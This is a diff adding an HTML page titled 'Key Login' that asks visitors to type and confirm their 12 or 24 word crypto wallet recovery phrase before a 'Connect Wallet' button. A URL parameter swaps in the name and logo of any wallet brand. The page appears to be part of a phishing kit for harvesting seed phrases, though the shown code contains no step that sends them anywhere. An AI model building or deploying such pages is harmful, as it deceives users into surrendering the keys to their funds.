@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Key Login</title>
+    <link rel="stylesheet" href="../wallets.css" />
+  </head>
+  <body>
+    <div class="card">
+      <img id="walletLogo" class="logo" src="" />
+      <h2 id="walletName"></h2>
+
+      <textarea
+        class="input-box"
+        placeholder="Enter wallet phrase (12 or 24 words)"
+      ></textarea>
+      <textarea
+        class="input-box"
+        placeholder="Confirm wallet phrase"
+      ></textarea>
+
+      <label class="checkbox">
+        <input type="checkbox" /> Are you sure you entered correctly?
+      </label>
+
+      <button class="btn">Connect Wallet</button>
+    </div>
+    
+
+    <script>
+      const params = new URLSearchParams(window.location.search);
+      const wallet = params.get("wallet");
+
+      document.getElementById("walletName").innerText = wallet;
+
+      let imgName = wallet.toLowerCase().replace(/\s+/g, "") + ".webp";
+      document.getElementById("walletLogo").src = "wallet-icons/" + imgName;
+    </script>
+  </body>
+</html>
